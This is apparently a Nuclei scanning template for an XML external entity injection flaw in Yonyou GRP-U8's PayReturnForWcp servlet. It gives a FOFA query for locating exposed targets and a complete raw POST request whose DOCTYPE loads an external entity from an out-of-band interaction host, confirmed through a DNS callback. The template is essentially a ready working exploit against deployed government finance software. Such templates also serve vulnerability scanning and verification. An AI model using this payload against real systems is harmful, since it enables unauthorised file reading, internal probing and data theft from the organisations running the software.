id: yonyou-grp-u8-payreturnforwcp-xxe
info:
  name: "用友GRP-U8 PayReturnForWcp 接口 XML 外部实体注入漏洞"
  author: 0dayPoc
  severity: high
  description: |-
    fofa: body="GRP-U8" || body="R9iPortal"
      用友GRP-U8行政事业内控管理系统PayReturnForWcp接口存在XML外部实体注入缺陷。攻击者可通过构造恶意XML实体，利用XML解析器处理逻辑缺陷触发任意文件读取、远程资源访问及端口探测等攻击行为，可能导致敏感数据泄露、服务可用性受损或系统权限被突破。
  tags: 用友
http:
- raw:
  - |
    POST /servlet/PayReturnForWcp HTTP/1.1
    Host: {{Hostname}}
    Cache-Control: max-age=0
    DNT: 1
    Upgrade-Insecure-Requests: 1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cookie: JSESSIONID=6C0DA8A7DF854722ECB4A690B53F0C00
    Connection: close
    Content-Type: application/x-www-form-urlencoded

    <?xml version="1.0"?>
    <!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://{{interactsh-url}}"> %remote;]>
  matchers-condition: and
  matchers:
  - type: status
    status:
    - 200
  - type: word
    part: interactsh_protocol
    words:
    - "dns"
